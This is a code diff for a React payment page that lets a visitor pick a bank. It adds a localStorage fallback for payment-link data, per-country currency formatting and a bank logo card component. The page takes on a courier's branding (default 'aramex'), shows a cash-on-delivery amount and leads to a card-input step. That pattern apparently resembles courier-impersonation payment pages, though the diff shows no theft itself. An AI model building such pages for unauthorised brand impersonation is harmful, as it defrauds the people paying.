@@ -9,6 +9,8 @@ import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
+import { BankLogoCard } from "@/components/CompanyLogo";
+import { formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -21,20 +23,24 @@ const PaymentBankSelector = () => {
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
   
-  // Get country from link data
-  const countryCode = linkData?.country_code || "";
+  // Fallback to localStorage if linkData is not available
+  const localData = id ? localStorage.getItem(`payment_${id}`) : null;
+  const localPayload = localData ? JSON.parse(localData) : null;
+  
+  // Get country from link data or localStorage
+  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || localPayload?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   
   // Get preselected bank from link payload if available
-  const preselectedBank = linkData?.payload?.selected_bank;
+  const preselectedBank = linkData?.payload?.selected_bank || localPayload?.selected_bank;
   
-  // Get customer info from link data (cross-device compatible)
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  // Get customer info from link data or localStorage (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || localPayload?.customerInfo || {};
+  const serviceKey = linkData?.payload?.service_key || localPayload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || localPayload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = (linkData?.payload || localPayload) as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
@@ -52,7 +58,7 @@ const PaymentBankSelector = () => {
     }
   }
 
-  const formattedAmount = `${amount} ر.س`;
+  const formattedAmount = formatCurrency(amount, countryCode);
   
   // Load banks when country is available from link data
   useEffect(() => {
@@ -77,22 +83,28 @@ const PaymentBankSelector = () => {
   };
   
   const handleSkip = async () => {
-    if (!linkData) return;
-
     // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: 'skipped',
-      };
+    const updatedPayload = {
+      ...(linkData?.payload || localPayload || {}),
+      selectedCountry: countryCode,
+      selectedBank: 'skipped',
+    };
 
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      console.error('Error saving bank selection:', error);
+    // Save to localStorage as fallback
+    if (id) {
+      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
+    }
+
+    // Try to save to Supabase if available
+    if (linkData) {
+      try {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+        console.error('Error saving bank selection:', error);
+      }
     }
 
     toast({
@@ -104,29 +116,37 @@ const PaymentBankSelector = () => {
   };
 
   const handleContinue = async () => {
-    if (!linkData || !selectedBank) return;
+    if (!selectedBank) return;
 
     // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: selectedBank,
-      };
+    const updatedPayload = {
+      ...(linkData?.payload || localPayload || {}),
+      selectedCountry: countryCode,
+      selectedBank: selectedBank,
+    };
 
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      console.error('Error saving bank selection:', error);
+    // Save to localStorage as fallback
+    if (id) {
+      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
+    }
+
+    // Try to save to Supabase if available
+    if (linkData) {
+      try {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+        console.error('Error saving bank selection:', error);
+      }
     }
 
     navigate(`/pay/${id}/card-input`);
   };
   
-  // Show loading state while fetching link data
-  if (linkLoading || !linkData) {
+  // Show loading state only while fetching (not if data is missing)
+  if (linkLoading) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
@@ -220,55 +240,15 @@ const PaymentBankSelector = () => {
         ) : (
           <>
             {/* Banks Grid */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
               {banks.map((bank) => (
-                <Card
+                <BankLogoCard
                   key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
-                    selectedBank === bank.id
-                      ? 'ring-2 bg-primary/5'
-                      : 'hover:bg-accent/50'
-                  }`}
-                  style={{
-                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
-                  }}
+                  bankId={bank.id}
+                  selected={selectedBank === bank.id}
                   onClick={() => handleBankSelect(bank.id)}
-                >
-                  <div className="flex items-center gap-3">
-                    <div
-                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
-                      style={{
-                        background: selectedBank === bank.id
-                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                          : '#64748b',
-                      }}
-                    >
-                      {bank.nameAr.charAt(0)}
-                    </div>
-                    <div className="flex-1">
-                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
-                      <p className="text-xs text-muted-foreground">{bank.name}</p>
-                    </div>
-                    {selectedBank === bank.id && (
-                      <div
-                        className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: branding.colors.primary }}
-                      >
-                        <svg
-                          className="w-3 h-3 text-white"
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M5 13l4 4L19 7" />
-                        </svg>
-                      </div>
-                    )}
-                  </div>
-                </Card>
+                  className="hover:scale-102 transition-transform"
+                />
               ))}
             </div>
 
